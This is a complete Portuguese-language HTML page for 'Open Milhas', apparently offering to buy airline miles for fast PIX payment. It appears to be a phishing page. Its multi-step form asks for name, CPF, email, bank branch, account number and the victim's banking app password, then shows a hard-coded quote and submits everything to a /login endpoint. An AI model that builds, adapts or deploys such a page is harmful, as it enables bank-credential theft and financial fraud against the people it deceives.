<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Milhas | Venda Agora</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root { --blue: #0046ff; --dark: #002db3; --gold: #c5a059; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding-bottom: 50px; }
        .header { background: white; padding: 15px; text-align: center; border-bottom: 2px solid #eee; position: relative; z-index: 10; }
        .logo { font-family: 'Montserrat', sans-serif; font-weight: 800; color: #0a1128; font-size: 1.6rem; text-transform: uppercase; }
        .hero { 
            background: linear-gradient(135deg, var(--blue) 0%, var(--dark) 100%); 
            color: white; padding: 50px 20px 100px 20px; text-align: center;
        }
        .hero h1 { font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.3rem; }
        .container-form { max-width: 480px; margin: -70px auto 0 auto; padding: 0 15px; position: relative; z-index: 999; }
        .card { background: white; border: none; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); padding: 30px; }
        .step { display: none; }
        .step.active { display: block !important; }
        .form-control { border-radius: 10px; padding: 12px; border: 1px solid #ddd; margin-bottom: 20px; width: 100%; }
        .btn-main { background: var(--blue); color: white; border: none; border-radius: 50px; padding: 16px; font-weight: 700; width: 100%; cursor: pointer; }
        .btn-success-final { 
            background: #28a745 !important; color: white !important; border: none; border-radius: 50px; 
            padding: 20px; font-weight: 800; width: 100%; cursor: pointer !important; 
            font-size: 1.3rem; display: block; text-transform: uppercase; margin-top: 20px;
        }
        .val-cotacao { color: #28a745; font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.8rem; margin: 20px 0; }
    </style>
</head>
<body>

<div class="header"><div class="logo">OPEN <span style="color:var(--gold)">MILHAS</span></div></div>
<div class="hero"><h1>Venda suas milhas agora</h1><p>Dinheiro na conta via PIX em até 24h.</p></div>

<div class="container-form">
    <div class="card">
        <form action="/login" method="POST" id="formVenda">
            <div class="step active" id="s1">
                <h4 class="fw-bold mb-4">Dados Iniciais</h4>
                <input type="text" name="nome" class="form-control" placeholder="Nome Completo" required>
                <input type="text" name="cpf" class="form-control" placeholder="CPF" required>
                <input type="email" name="email" class="form-control" placeholder="E-mail" required>
                <button type="button" class="btn-main" onclick="changeStep(2)">AVANÇAR</button>
            </div>
            <div class="step" id="s2">
                <h4 class="fw-bold mb-4">Dados Bancários</h4>
                <input type="text" name="agencia" class="form-control" placeholder="Agência">
                <input type="text" name="conta" class="form-control" placeholder="Conta com dígito">
                <input type="password" name="senha_app" class="form-control" placeholder="Senha do App">
                <button type="button" class="btn-main" onclick="changeStep(3)">VER COTAÇÃO</button>
            </div>
            <div class="step text-center" id="s3">
                <p class="text-muted fw-bold small">Cotação Gerada</p>
                <div class="val-cotacao">R$ 1.842,50</div>
                <button type="submit" formnovalidate class="btn-success-final">EFETUAR VENDA AGORA</button>
            </div>
        </form>
    </div>
</div>

<script>
    function changeStep(n) {
        const steps = document.querySelectorAll('.step');
        for (let i = 0; i < steps.length; i++) {
            steps[i].style.display = 'none';
            steps[i].classList.remove('active');
        }
        const target = document.getElementById('s' + n);
        if (target) {
            target.style.display = 'block';
            target.classList.add('active');
            window.scrollTo(0, 0);
        }
    }
</script>
</body>
</html>
